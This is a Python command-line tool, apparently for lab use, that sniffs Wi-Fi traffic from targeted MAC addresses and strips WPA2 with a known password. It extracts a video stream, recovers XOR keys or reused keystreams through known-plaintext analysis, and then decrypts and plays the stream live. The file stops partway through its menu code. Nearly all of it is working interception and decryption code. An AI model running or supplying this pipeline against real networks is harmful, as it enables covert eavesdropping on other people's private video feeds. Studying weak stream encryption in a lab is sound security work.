#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║         VIDEO CRYPTO PIPELINE — Interactive CLI          ║
║   Capture → Extract → Analyze → Decrypt → Live View     ║
╚══════════════════════════════════════════════════════════╝
Usage:
    sudo python3 videopipeline.py          # interactive menu
    sudo python3 videopipeline.py --config lab.json --stage all
"""

import argparse
import glob
import json
import math
import os
import shutil
import socket
import subprocess
import sys
import threading
import time
from collections import deque
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import Optional

# ── Platform detection ──────────────────────────────────
IS_WINDOWS = sys.platform.startswith("win")


def is_admin() -> bool:
    """Return True if the current process has administrator / root privileges."""
    if IS_WINDOWS:
        try:
            import ctypes
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False
    else:
        return os.geteuid() == 0


def relaunch_as_admin():
    """Relaunch this script elevated via UAC (Windows only) and exit the current process."""
    import ctypes
    script = os.path.abspath(sys.argv[0])
    args   = " ".join(sys.argv[1:])
    # ShellExecuteW with 'runas' triggers the UAC prompt
    ret = ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, f'"{script}" {args}', None, 1
    )
    if ret <= 32:
        err(f"UAC elevation failed (code {ret}) — please re-run as Administrator manually.")
    sys.exit(0)

# ── Optional heavy deps — warn if missing ──────────────────
try:
    import numpy as np
    HAS_NUMPY = True
except ImportError:
    HAS_NUMPY = False

try:
    from scapy.all import IP, TCP, UDP, Raw, rdpcap
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False


# ══════════════════════════════════════════════════════════
# TERMINAL UI HELPERS
# ══════════════════════════════════════════════════════════

# Enable colors for Linux or Windows Terminal (WT_SESSION is set in Windows Terminal)
if not IS_WINDOWS or os.getenv("WT_SESSION"):
    CYAN   = "\033[96m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    RED    = "\033[91m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"
else:
    CYAN = GREEN = YELLOW = RED = BOLD = DIM = RESET = ""

def banner():
    print(f"""
{CYAN}{BOLD}╔══════════════════════════════════════════════════════════╗
║         VIDEO CRYPTO PIPELINE  v1.0                      ║
║   WiFi Capture → Stream Extract → Crypto Analysis        ║
║   Known-Plaintext Attack → Live Decrypted Playback       ║
╚══════════════════════════════════════════════════════════╝{RESET}
""")

def section(title):
    print(f"\n{CYAN}{BOLD}── {title} {'─' * (50 - len(title))}{RESET}")

def ok(msg):    print(f"{GREEN}[+]{RESET} {msg}")
def info(msg):  print(f"{CYAN}[*]{RESET} {msg}")
def warn(msg):  print(f"{YELLOW}[!]{RESET} {msg}")
def err(msg):   print(f"{RED}[✗]{RESET} {msg}")
def done(msg):  print(f"{GREEN}{BOLD}[✓]{RESET} {msg}")

def ask(prompt, default=None):
    suffix = f" [{default}]" if default is not None else ""
    try:
        val = input(f"{YELLOW}  >{RESET} {prompt}{suffix}: ").strip()
        return val if val else (str(default) if default is not None else "")
    except (KeyboardInterrupt, EOFError):
        print()
        return str(default) if default is not None else ""

def confirm(prompt, default=True):
    yn = "Y/n" if default else "y/N"
    try:
        val = input(f"{YELLOW}  >{RESET} {prompt} [{yn}]: ").strip().lower()
        if not val:
            return default
        return val.startswith("y")
    except (KeyboardInterrupt, EOFError):
        print()
        return default

def choose(prompt, options: list, default=0):
    print(f"\n{YELLOW}  {prompt}{RESET}")
    for i, opt in enumerate(options):
        marker = f"{GREEN}→{RESET}" if i == default else " "
        print(f"  {marker} [{i+1}] {opt}")
    try:
        val = input(f"{YELLOW}  >{RESET} Choice [{default+1}]: ").strip()
        idx = int(val) - 1 if val else default
        return max(0, min(idx, len(options) - 1))
    except (ValueError, KeyboardInterrupt, EOFError):
        return default

def check_deps():
    """Check for required external tools and Python packages"""
    section("Dependency Check")
    tools = {
        "tcpdump":     "Packet capture",
        "airdecap-ng": "WiFi layer decryption",
        "tshark":      "Stream extraction",
        "ffplay":      "Live video playback",
    }
    all_ok = True
    for tool, purpose in tools.items():
        found = shutil.which(tool)
        status = f"{GREEN}✓{RESET}" if found else f"{RED}✗{RESET}"
        print(f"  {status}  {tool:<15} {DIM}{purpose}{RESET}")
        if not found:
            all_ok = False

    print()
    py_deps = {"scapy": HAS_SCAPY, "numpy": HAS_NUMPY}
    for pkg, avail in py_deps.items():
        status = f"{GREEN}✓{RESET}" if avail else f"{YELLOW}~{RESET}"
        note   = "" if avail else f"  {DIM}pip install {pkg}{RESET}"
        print(f"  {status}  {pkg:<15}{note}")

    if not HAS_SCAPY:
        warn("scapy missing — extraction stage unavailable. Run: pip install scapy")
    if not HAS_NUMPY:
        warn("numpy missing — some analysis features disabled. Run: pip install numpy")

    return all_ok


def list_interfaces():
    """Return list of (number, name, description) tuples.

    Priority:
      1. tcpdump -D  (gives NPcap paths directly — requires admin)
      2. PowerShell Get-NetAdapter + InterfaceGuid  (builds \\Device\\NPF_{GUID})
    """

    def _parse_tcpdump(output):
        ifaces = []
        for line in output.splitlines():
            line = line.strip()
            if not line:
                continue
            parts = line.split(".", 1)
            if len(parts) < 2:
                continue
            num  = parts[0].strip()
            rest = parts[1].strip()
            if "(" in rest and ")" in rest:
                name = rest[:rest.index("(")].strip()
                desc = rest[rest.index("(")+1 : rest.rindex(")")].strip()
            else:
                name, desc = rest, ""
            ifaces.append((num, name, desc))
        return ifaces

    # ── 1. Try tcpdump -D ────────────────────────────────
    try:
        result = subprocess.run(
            ["tcpdump", "-D"], capture_output=True, text=True, timeout=5
        )
        if result.stdout.strip():
            ifaces = _parse_tcpdump(result.stdout)
            if ifaces:
                return ifaces
    except Exception:
        pass

    # ── 2. PowerShell: get Name + InterfaceGuid → build NPcap path ──
    if IS_WINDOWS:
        try:
            ps_cmd = [
                "powershell", "-NoProfile", "-Command",
                "Get-NetAdapter | Select-Object Name,InterfaceDescription,InterfaceGuid,Status"
                " | ConvertTo-Csv -NoTypeInformation"
            ]
            result = subprocess.run(
                ps_cmd, capture_output=True, text=True, timeout=8
            )
            lines = result.stdout.strip().splitlines()
            if len(lines) > 1:
                ifaces = []
                for i, line in enumerate(lines[1:], start=1):
                    parts = [p.strip().strip('"') for p in line.split('","')]
                    if len(parts) < 3:
                        continue
                    friendly = parts[0]
                    desc     = parts[1]
                    guid     = parts[2].strip("{}")   # remove braces if present
                    if not guid:
                        continue
                    npf_name = f"\\Device\\NPF_{{{guid}}}"
                    ifaces.append((str(i), npf_name, f"{friendly} — {desc}"))
                if ifaces:
                    return ifaces
        except Exception as e:
            warn(f"PowerShell interface lookup failed: {e}")

    return []


def pick_interface(current):
    """Interactively pick a tcpdump interface."""
    ifaces = list_interfaces()

    if not ifaces:
        print(f"""
{YELLOW}  Could not enumerate interfaces automatically.{RESET}
  To find your interface name, run ONE of these in an {BOLD}Administrator{RESET} terminal:

    {CYAN}tcpdump -D{RESET}                       (lists all NPcap interfaces)
    {CYAN}Get-NetAdapter{RESET}  (PowerShell)       (lists friendly adapter names)

  Then paste the full name here, e.g.:
    {DIM}\\Device\\NPF_{{12AB34CD-...}}{RESET}   (from tcpdump -D)
    {DIM}Wi-Fi{RESET} or {DIM}Ethernet{RESET}              (friendly name, if NPcap supports it)

  {YELLOW}Note:{RESET} If tcpdump -D shows nothing, re-run this script as Administrator.
""")
        return ask("Interface name", current if current else "")

    section("Available Interfaces")
    for num, name, desc in ifaces:
        label = f"  {GREEN}{num}{RESET}. {name}"
        if desc:
            label += f"  {DIM}({desc}){RESET}"
        print(label)

    val = ask("Enter interface number or full name", current if current else ifaces[0][1])
    # Resolve bare number → full name
    for num, name, desc in ifaces:
        if val == num:
            ok(f"Selected: {name}")
            return name
    return val


# ══════════════════════════════════════════════════════════
# CONFIG
# ══════════════════════════════════════════════════════════

DEFAULT_CONFIG = {
    "interface":          "" if IS_WINDOWS else "wlan0mon",
    "target_macs":        [],
    "ap_essid":           "",
    "ap_bssid":           "",
    "ap_channel":         6,
    "wpa_password":       "",
    "video_port":         5004,
    "protocol":           "udp",
    "output_dir":         "./pipeline_output",
    "capture_duration":   60,
    "custom_header_size": 0,
    "custom_magic_hex":   "",
    "video_codec":        "mjpeg",
    "live_output_port":   5005,
    "live_mode":          False,
    "auto_analyze":       True,
}

def load_config(path=None):
    cfg = DEFAULT_CONFIG.copy()
    if path and os.path.exists(path):
        with open(path) as f:
            cfg.update(json.load(f))
        ok(f"Config loaded from {path}")
    return cfg

def save_config(cfg, path="lab.json"):
    with open(path, "w") as f:
        json.dump(cfg, f, indent=2)
    ok(f"Config saved → {path}")

def interactive_config(cfg):
    """Walk user through config setup"""
    section("Configuration Setup")

    if confirm("Pick interface from list?", default=True):
        cfg["interface"] = pick_interface(cfg["interface"])
    else:
        cfg["interface"] = ask("Monitor-mode interface", cfg["interface"])
    macs_raw                  = ask("Target MACs (comma-separated, blank=all)", ",".join(cfg["target_macs"]))
    cfg["target_macs"]        = [m.strip() for m in macs_raw.split(",") if m.strip()]
    cfg["ap_essid"]           = ask("AP ESSID (network name)", cfg["ap_essid"])
    cfg["wpa_password"]       = ask("WPA2 password (for WiFi-layer strip)", cfg["wpa_password"])
    cfg["video_port"]         = int(ask("Video stream port", cfg["video_port"]))
    proto_idx                 = choose("Protocol", ["udp", "tcp"],
                                       default=0 if cfg["protocol"] == "udp" else 1)
    cfg["protocol"]           = ["udp", "tcp"][proto_idx]
    cfg["capture_duration"]   = int(ask("Capture duration seconds (0=manual stop)", cfg["capture_duration"]))
    cfg["output_dir"]         = ask("Output directory", cfg["output_dir"])
    cfg["custom_header_size"] = int(ask("Custom format header bytes to strip", cfg["custom_header_size"]))
    cfg["video_codec"]        = ask("Video codec for ffplay (mjpeg/h264/rawvideo/mpegts)", cfg["video_codec"])

    if confirm("Save config to lab.json?"):
        save_config(cfg)

    return cfg


# ══════════════════════════════════════════════════════════
# STAGE 1 — CAPTURE
# ══════════════════════════════════════════════════════════

class Capture:
    def __init__(self, cfg):
        self.cfg = cfg
        self.raw = os.path.join(cfg["output_dir"], "raw_capture.pcap")
        self.dec = os.path.join(cfg["output_dir"], "decrypted_wifi.pcap")

    def build_bpf(self):
        macs = self.cfg["target_macs"]
        if not macs:
            return None
        return " or ".join(f"ether host {m}" for m in macs)

    def _ensure_interface(self):
        """On Windows, validate the interface and prompt to pick if it looks unconfigured."""
        iface = self.cfg["interface"]
        if not IS_WINDOWS:
            return iface

        # A bare number or empty string means it was never set properly
        if not iface or iface.isdigit():
            warn(f"Interface {repr(iface)} is not a valid NPcap interface name.")
            iface = pick_interface(iface or "")
            self.cfg["interface"] = iface
        return iface

    def run(self):
        section("Stage 1 — WiFi Capture")
        os.makedirs(self.cfg["output_dir"], exist_ok=True)
        self._ensure_interface()
        bpf      = self.build_bpf()
        duration = self.cfg["capture_duration"]

        info(f"Interface  : {self.cfg['interface']}")
        info(f"Filter     : {bpf or '(none — all traffic)'}")
        info(f"Duration   : {duration}s" if duration else "Duration   : manual (Ctrl+C to stop)")
        info(f"Output     : {self.raw}")

        # ── Pre-flight: test interface with a 2-packet probe ──
        test_cmd = ["tcpdump", "-i", self.cfg["interface"], "-c", "2",
                    "-w", os.devnull if not IS_WINDOWS else "nul"]
        if not IS_WINDOWS:
            test_cmd.insert(0, "sudo")
        info("Testing interface (2-packet probe)...")
        test = subprocess.run(test_cmd, capture_output=True, timeout=8)
        if test.returncode not in (0, 1, 2):   # 0=ok, 1/2=timeout/sigterm (still valid)
            err_msg = test.stderr.decode(errors="replace").strip()
            rc      = test.returncode & 0xFFFFFFFF   # interpret as unsigned 32-bit

            # Decode common Windows NTSTATUS codes that tcpdump surfaces
            NTSTATUS = {
                0xC0000139: ("STATUS_ENTRYPOINT_NOT_FOUND",
                             "NPcap DLL missing or version mismatch with tcpdump.\n"
                             "  Fix: download and install NPcap from https://npcap.com\n"
                             "       then restart this script."),
                0xC0000135: ("STATUS_DLL_NOT_FOUND",
                             "A required DLL (likely wpcap.dll from NPcap) was not found.\n"
                             "  Fix: install NPcap from https://npcap.com"),
                0xC0000022: ("STATUS_ACCESS_DENIED",
                             "Permission denied — run this script as Administrator."),
                0xC000003A: ("STATUS_OBJECT_PATH_NOT_FOUND",
                             "Interface path not found — the selected adapter may be disabled."),
            }

            if rc in NTSTATUS:
                code_name, guidance = NTSTATUS[rc]
                err(f"tcpdump failed: {code_name} (0x{rc:08X})")
                warn(guidance)
            else:
                err(f"Interface test failed (rc=0x{rc:08X}): {err_msg}")
                if IS_WINDOWS:
                    warn("Re-run Configure → pick the correct interface from the list")
                    ifaces = list_interfaces()
                    if ifaces:
                        for num, name, desc in ifaces:
                            print(f"  {num}. {name}" + (f"  ({desc})" if desc else ""))
            return None
        ok("Interface OK")

        # On Windows, omit 'sudo'; --immediate-mode not supported on all NPcap builds
        cmd = ["tcpdump", "-i", self.cfg["interface"], "-w", self.raw]
        if not IS_WINDOWS:
            cmd.insert(0, "sudo")
            cmd.append("--immediate-mode")
        if bpf:
            cmd.append(bpf)

        if duration > 0:
            try:
                proc = subprocess.Popen(cmd, stderr=subprocess.PIPE)
            except FileNotFoundError:
                err("tcpdump not found — install Npcap + tcpdump for Windows")
                return None
            for remaining in range(duration, 0, -1):
                print(f"\r  {CYAN}Capturing...{RESET} {remaining:3d}s remaining  ", end="", flush=True)
                time.sleep(1)
            proc.terminate()
            proc.wait()
            stderr_out = proc.stderr.read().decode(errors="replace").strip()
            if stderr_out:
                print(f"\n{DIM}  tcpdump: {stderr_out}{RESET}")
            print()
        else:
            info("Press Ctrl+C to stop capture")
            try:
                subprocess.run(cmd)
            except KeyboardInterrupt:
                print()

        if os.path.exists(self.raw) and os.path.getsize(self.raw) > 0:
            size = os.path.getsize(self.raw)
            done(f"Capture complete — {size / 1024:.1f} KB saved")
            return self.raw
        else:
            err("Capture produced no output")
            if IS_WINDOWS:
                ifaces = list_interfaces()
                if ifaces:
                    warn("Available interfaces (run Configure → pick interface):")
                    for num, name, desc in ifaces:
                        label = f"  {num}. {name}"
                        if desc:
                            label += f"  ({desc})"
                        print(label)
                else:
                    warn("Ensure Npcap is installed: https://npcap.com")
            return None

    def strip_wifi_layer(self):
        section("WPA2 Layer Strip")
        cfg = self.cfg
        if not cfg["wpa_password"]:
            warn("No WPA2 password configured — skipping WiFi layer strip")
            return self.raw

        info("Running airdecap-ng...")
        cmd = ["airdecap-ng", "-e", cfg["ap_essid"], "-p", cfg["wpa_password"], self.raw]
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(DIM + result.stdout.strip() + RESET)

        airdecap_out = self.raw.replace(".pcap", "-dec.pcap")
        if os.path.exists(airdecap_out):
            os.rename(airdecap_out, self.dec)
            done(f"WiFi-decrypted pcap → {self.dec}")
            return self.dec
        else:
            warn("airdecap-ng produced no output — using raw pcap as-is")
            return self.raw


# ══════════════════════════════════════════════════════════
# STAGE 2 — STREAM EXTRACTION
# ══════════════════════════════════════════════════════════

@dataclass
class FrameMeta:
    index:     int
    timestamp: float
    src:       str
    dst:       str
    length:    int
    file:      str

class StreamExtractor:
    def __init__(self, cfg):
        self.cfg           = cfg
        self.frame_dir     = os.path.join(cfg["output_dir"], "encrypted_frames")
        self.manifest_path = os.path.join(cfg["output_dir"], "manifest.json")

    def extract(self, pcap_path):
        section("Stage 2 — Stream Extraction")
        if not HAS_SCAPY:
            err("scapy not installed — cannot extract. Run: pip install scapy")
            return []

        os.makedirs(self.frame_dir, exist_ok=True)
        info(f"Reading     : {pcap_path}")
        info(f"Port filter : {self.cfg['protocol'].upper()}:{self.cfg['video_port']}")
        info(f"Frame dir   : {self.frame_dir}")

        packets  = rdpcap(pcap_path)
        frames   = []
        port     = self.cfg["video_port"]
        layer    = UDP if self.cfg["protocol"] == "udp" else TCP
        header_s = self.cfg.get("custom_header_size", 0)

        for i, pkt in enumerate(packets):
            if IP not in pkt or layer not in pkt:
                continue
            if pkt[layer].dport != port and pkt[layer].sport != port:
                continue
            if Raw not in pkt:
                continue

            payload = bytes(pkt[Raw])
            if header_s:
                payload = payload[header_s:]   # strip custom header

            fname = os.path.join(self.frame_dir, f"frame_{i:06d}.bin")
            with open(fname, "wb") as f:
                f.write(payload)

            frames.append(FrameMeta(
                index=i, timestamp=float(pkt.time),
                src=pkt[IP].src, dst=pkt[IP].dst,
                length=len(payload), file=fname
            ))
            if len(frames) % 100 == 0:
                print(f"\r  Extracted {len(frames)} frames...", end="", flush=True)

        print()
        with open(self.manifest_path, "w") as f:
            json.dump([asdict(fr) for fr in frames], f, indent=2)

        done(f"Extracted {len(frames)} frames → {self.frame_dir}")
        return frames


# ══════════════════════════════════════════════════════════
# STAGE 3 — FORMAT DETECTION
# ══════════════════════════════════════════════════════════

class FormatDetector:
    def __init__(self, cfg):
        self.cfg = cfg

    def detect(self, frame_dir):
        section("Stage 3 — Format & Entropy Analysis")
        files = sorted(glob.glob(os.path.join(frame_dir, "*.bin")))
        if not files:
            warn("No frames found to analyze")
            return {}

        sample = bytearray(open(files[0], "rb").read())
        result = {}

        # Magic bytes
        result["first_4_bytes"]  = sample[:4].hex()
        result["first_16_bytes"] = sample[:16].hex()
        info(f"First 4 bytes  : {result['first_4_bytes']}")
        info(f"First 16 bytes : {result['first_16_bytes']}")

        # Entropy
        byte_counts = [0] * 256
        for b in sample:
            byte_counts[b] += 1
        entropy = -sum(
            (c / len(sample)) * math.log2(c / len(sample))
            for c in byte_counts if c > 0
        )
        result["entropy"] = round(entropy, 3)

        if entropy > 7.5:
            assessment = f"{RED}High — likely encrypted or compressed{RESET}"
        elif entropy > 6.0:
            assessment = f"{YELLOW}Medium — partial encryption or structured data{RESET}"
        else:
            assessment = f"{GREEN}Low — likely plaintext or weak cipher{RESET}"
        info(f"Entropy        : {entropy:.3f} — {assessment}")

        # Possible record stride detection
        for stride in [4, 8, 16, 32, 64, 128]:
            chunks = [bytes(sample[i:i + stride])
                      for i in range(0, min(len(sample), stride * 8), stride)]
            if chunks and len(set(chunks)) < len(chunks) * 0.5:
                result["possible_record_size"] = stride
                info(f"Possible record stride : {stride} bytes")
                break

        return result


# ══════════════════════════════════════════════════════════
# STAGE 4 — KNOWN-PLAINTEXT ANALYSIS
# ══════════════════════════════════════════════════════════

class CryptoAnalyzer:
    def __init__(self, cfg):
        self.cfg         = cfg
        self.report_path = os.path.join(cfg["output_dir"], "analysis_report.json")
        self.ks_dir      = os.path.join(cfg["output_dir"], "keystreams")

    def _load_bins(self, directory):
        frames = []
        for f in sorted(glob.glob(os.path.join(directory, "*.bin"))):
            with open(f, "rb") as fh:
                frames.append(bytearray(fh.read()))
        return frames

    def _xor(self, a, b):
        n = min(len(a), len(b))
        return bytearray(a[i] ^ b[i] for i in range(n))

    def _find_key_period(self, ks, max_p=512):
        for p in range(1, min(max_p, len(ks) // 2)):
            if all(ks[i] == ks[i % p] for i in range(min(len(ks), p * 4))):
                return p
        return None

    def _chi_squared(self, data):
        if not HAS_NUMPY:
            byte_counts = [0] * 256
            for b in data:
                byte_counts[b] += 1
            expected = len(data) / 256
            return sum((c - expected) ** 2 / expected for c in byte_counts)
        flat     = np.frombuffer(bytes(data), dtype=np.uint8)
        hist, _  = np.histogram(flat, bins=256, range=(0, 256))
        expected = len(data) / 256
        return float(np.sum((hist - expected) ** 2 / expected))

    def _align(self, enc_frames, dec_frames):
        """Align encrypted/decrypted frame pairs by closest length"""
        aligned, used = [], set()
        for enc in enc_frames:
            best_j, best_d = None, float("inf")
            for j, dec in enumerate(dec_frames):
                if j in used:
                    continue
                d = abs(len(enc) - len(dec))
                if d < best_d:
                    best_d, best_j = d, j
            if best_j is not None and best_d < 128:
                aligned.append((enc, dec_frames[best_j]))
                used.add(best_j)
        return aligned

    def analyze(self, decrypted_dir=None):
        section("Stage 4 — Cryptographic Analysis")
        enc_dir    = os.path.join(self.cfg["output_dir"], "encrypted_frames")
        enc_frames = self._load_bins(enc_dir)

        if not enc_frames:
            err("No encrypted frames — run extraction first")
            return {}

        report = {
            "total_frames":       len(enc_frames),
            "avg_frame_size":     int(sum(len(f) for f in enc_frames) / len(enc_frames)),
            "cipher_analysis":    {},
            "keystream_analysis": {},
            "key_material":       {},
            "recommendations":    []
        }

        # ── Ciphertext-only ──────────────────────────────────
        info("Running ciphertext-only analysis...")
        flat = bytearray()
        for f in enc_frames:
            flat.extend(f)
        chi = self._chi_squared(flat)
        report["cipher_analysis"]["chi_squared"] = round(chi, 2)

        if chi < 300:
            assessment = f"{RED}Non-uniform — weak/custom cipher or IV leak{RESET}"
            report["recommendations"].append("Ciphertext not uniform — cipher weakness likely")
        elif chi < 600:
            assessment = f"{YELLOW}Slightly non-uniform — possible padding pattern{RESET}"
        else:
            assessment = f"{GREEN}Uniform — consistent with AES-CTR / ChaCha20 / AES-GCM{RESET}"
        info(f"Chi-squared : {chi:.2f} — {assessment}")
        report["cipher_analysis"]["assessment"] = assessment.replace(
            YELLOW, "").replace(RED, "").replace(GREEN, "").replace(RESET, "")

        # ── Known-plaintext ──────────────────────────────────
        if decrypted_dir and os.path.isdir(decrypted_dir):
            info("Running known-plaintext analysis...")
            dec_frames = self._load_bins(decrypted_dir)
            aligned    = self._align(enc_frames, dec_frames)
            ok(f"Aligned {len(aligned)} frame pairs")

            if aligned:
                keystreams = [self._xor(e, d) for e, d in aligned]
                os.makedirs(self.ks_dir, exist_ok=True)
                for i, ks in enumerate(keystreams):
                    with open(os.path.join(self.ks_dir, f"ks_{i:05d}.bin"), "wb") as f:
                        f.write(ks)

                # Nonce/keystream reuse
                reuse = sum(
                    1 for i in range(len(keystreams) - 1)
                    if keystreams[i][:32] == keystreams[i + 1][:32]
                )
                report["keystream_analysis"]["reuse_detected"] = reuse > 0
                if reuse > 0:
                    warn(f"KEYSTREAM REUSE in {reuse} pairs — nonce reuse vulnerability!")
                    report["recommendations"].append(
                        "CRITICAL: Nonce reuse — XOR of two ciphertexts = XOR of two plaintexts")

                # Repeating key period (XOR with fixed key)
                periods = []
                for i, ks in enumerate(keystreams[:20]):
                    p = self._find_key_period(ks)
                    if p:
                        periods.append(p)
                        key_hex = ks[:p].hex()
                        report["keystream_analysis"][f"frame_{i}_key_candidate"] = key_hex
                        info(f"Frame {i}: repeating period = {p} bytes | key = {key_hex[:32]}...")

                if periods:
                    best    = min(set(periods), key=periods.count)
                    key_hex = keystreams[0][:best].hex()
                    report["keystream_analysis"]["likely_key_length"] = best
                    report["key_material"] = {
                        "mode":    "static_key",
                        "key_hex": key_hex
                    }
                    ok(f"Recovered static XOR key ({best} bytes): {key_hex[:32]}...")
                    report["recommendations"].append(
                        f"Static XOR key recovered — {best} bytes, see key_material.key_hex")
                else:
                    # Store keystreams for CTR-like replay
                    report["key_material"] = {
                        "mode":          "ctr_keystream",
                        "keystream_dir": self.ks_dir
                    }
                    ok("No simple period found — keystreams stored for CTR-mode replay")

                # Block pattern (ECB)
                for ks in keystreams[:10]:
                    for bs in [8, 16, 32]:
                        blocks = [bytes(ks[i:i + bs]) for i in range(0, len(ks) - bs, bs)]
                        dupes  = len(blocks) - len(set(blocks))
                        if dupes > 2:
                            warn(f"Repeating {bs}-byte blocks ({dupes} dupes) — possible ECB mode")
                            report["keystream_analysis"]["ecb_block_size"] = bs
                            report["recommendations"].append(f"ECB pattern detected: {bs}-byte blocks")
                            break

        else:
            info("No decrypted frames provided — skipping known-plaintext stage")
            info("Re-run and choose 'Analyze' → supply decrypted directory when ready")

        with open(self.report_path, "w") as f:
            json.dump(report, f, indent=2)

        # ── Summary ──────────────────────────────────────────
        section("Analysis Summary")
        print(f"  Frames analyzed  : {report['total_frames']}")
        print(f"  Avg frame size   : {report['avg_frame_size']} bytes")
        print(f"  Chi-squared      : {report['cipher_analysis']['chi_squared']}")
        if report["key_material"]:
            mode = report["key_material"].get("mode", "?")
            ok(f"Key material recovered — mode: {mode}")
        if report["recommendations"]:
            print(f"\n  {BOLD}Findings:{RESET}")
            for r in report["recommendations"]:
                print(f"    {YELLOW}→{RESET} {r}")
        done(f"Report saved → {self.report_path}")

        return report


# ══════════════════════════════════════════════════════════
# STAGE 5 — LIVE DECRYPTION + PLAYBACK
# ══════════════════════════════════════════════════════════

class LiveDecryptor:
    def __init__(self, cfg, key_material: dict):
        self.cfg         = cfg
        self.km          = key_material
        self.running     = False
        self.frame_count = 0
        self.out_port    = cfg.get("live_output_port", 5005)
        self.in_port     = cfg.get("video_port", 5004)
        self.protocol    = cfg.get("protocol", "udp")
        self.key         = None
        self.key_len     = 0
        self.keystreams  = []

    def load_key(self):
        mode = self.km.get("mode")
        if mode in ("xor", "static_key"):
            kh = self.km.get("key_hex", "")
            if kh:
                self.key     = bytes.fromhex(kh)
                self.key_len = len(self.key)
                ok(f"Static XOR key loaded ({self.key_len} bytes)")
                return True
        elif mode == "ctr_keystream":
            ks_dir = self.km.get("keystream_dir",
                                 os.path.join(self.cfg["output_dir"], "keystreams"))
            for f in sorted(glob.glob(os.path.join(ks_dir, "*.bin"))):
                with open(f, "rb") as fh:
                    self.keystreams.append(bytearray(fh.read()))
            ok(f"Loaded {len(self.keystreams)} keystream blocks")
            return bool(self.keystreams)
        err("No usable key material — run analysis with decrypted frames first")
        return False

    def decrypt_frame(self, data: bytes) -> bytes:
        mode = self.km.get("mode")
        raw  = bytearray(data)
        if mode in ("xor", "static_key") and self.key:
            return bytes(raw[i] ^ self.key[i % self.key_len] for i in range(len(raw)))
        elif mode == "ctr_keystream" and self.keystreams:
            ks     = self.keystreams[self.frame_count % len(self.keystreams)]
            n      = min(len(raw), len(ks))
            result = bytearray(raw[i] ^ ks[i] for i in range(n))
            result.extend(raw[n:])
            return bytes(result)
        return data   # passthrough if no key

    def start_player(self):
        codec = self.cfg.get("video_codec", "mjpeg")
        cmd   = [
            "ffplay", "-f", codec,
            "-i", f"udp://127.0.0.1:{self.out_port}",
            "-fflags", "nobuffer",
            "-flags", "low_delay",
            "-framedrop",
            "-window_title", "Live Decrypted Stream",
        ]
        info(f"Launching ffplay ({codec}) ← udp://127.0.0.1:{self.out_port}")
        self.player = subprocess.Popen(cmd,
                                       stdout=subprocess.DEVNULL,
                                       stderr=subprocess.DEVNULL)

    def _listen_udp(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(("0.0.0.0", self.in_port))
        sock.settimeout(1.0)
        out = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.running:
            try:
                data, _ = sock.recvfrom(65535)
                dec = self.decrypt_frame(data)
                out.sendto(dec, ("127.0.0.1", self.out_port))
                self.frame_count += 1
                if self.frame_count % 30 == 0:
                    print(f"\r  {CYAN}Frames decrypted: {self.frame_count}{RESET}  ", end="", flush=True)
            except socket.timeout:
                continue
        sock.close()

    def _listen_tcp(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", self.in_port))
        srv.listen(1)
        srv.settimeout(1.0)
        out = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.running:
            try:
                conn, addr = srv.accept()
                ok(f"Connection from {addr}")
                while self.running:
                    chunk = conn.recv(65535)
                    if not chunk:
                        break
                    dec = self.decrypt_frame(chunk)
                    out.sendto(dec, ("127.0.0.1", self.out_port))
                    self.frame_count += 1
            except socket.timeout:
                continue
        srv.close()

    def start(self):
        section("Stage 5 — Live Decryption & Playback")
        if not self.load_key():
            return
        self.running = True
        self.start_player()
        fn = self._listen_udp if self.protocol == "udp" else self._listen_tcp
        t  = threading.Thread(target=fn, daemon=True)
        t.start()
        info(f"Listening on {self.protocol.upper()}:{self.in_port} — Ctrl+C to stop")
        try:
            while self.running:
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.running = False
            print()
            done(f"Stopped — {self.frame_count} total frames decrypted")


# ══════════════════════════════════════════════════════════
# INTERACTIVE MAIN MENU
# ══════════════════════════════════════════════════════════

def load_report(cfg):
    path = os.path.join(cfg["output_dir"], "analysis_report.json")
    if os.path.exists(path):
        with open(path) as f:
            return json.load(f)
    return None

def interactive_menu(cfg):
    while True:
        section("Main Menu")
        report  = load_report(cfg)
        has_key = report and bool(report.get("key_material"))
        has_enc = os.path.isdir(os.path.join(cfg["output_dir"], "encrypted_frames")) and \
                  bool(glob.glob(os.path.join(cfg["output_dir"], "encrypted_frames", "*.bin")))

        options = [
            "Configure settings",
            "Stage 1 — Capture WiFi packets",
            "Stage 1b — Strip WPA2 layer from existing pcap",
            "Stage 2 — Extract video stream from pcap",
            "Stage 3 — Format & entropy detection",
            "Stage 4 — Cryptographic analysis" + (" (provide decrypted dir)" if not has_key else f" {GREEN}[key recovered]{RESET}"),
            "Stage 5 — Live decryption + playback" + (f" {GREEN}[ready]{RESET}" if has_key else f" {RED}[needs key]{RESET}"),
            "Run full pipeline (all stages)",
            "Show last analysis report",
            "Check dependencies",
            "Exit",
        ]

        choice = choose("Select action", options)

        if choice == 0:
            cfg = interactive_config(cfg)

        elif choice == 1:
            cap  = Capture(cfg)
            pcap = cap.run()
            if pcap and cfg["wpa_password"] and confirm("Strip WPA2 layer now?"):
                cap.strip_wifi_layer()

        elif choice == 2:
            pcap = ask("Path to pcap file", os.path.join(cfg["output_dir"], "raw_capture.pcap"))
            if os.path.exists(pcap):
                cap = Capture(cfg)
                cap.raw = pcap
                cap.strip_wifi_layer()
            else:
                err(f"File not found: {pcap}")

        elif choice == 3:
            pcap = ask("Path to pcap file", os.path.join(cfg["output_dir"], "decrypted_wifi.pcap"))
            if not os.path.exists(pcap):
                pcap = ask("Trying raw capture instead", os.path.join(cfg["output_dir"], "raw_capture.pcap"))
            if os.path.exists(pcap):
                StreamExtractor(cfg).extract(pcap)
            else:
                err(f"File not found: {pcap}")

        elif choice == 4:
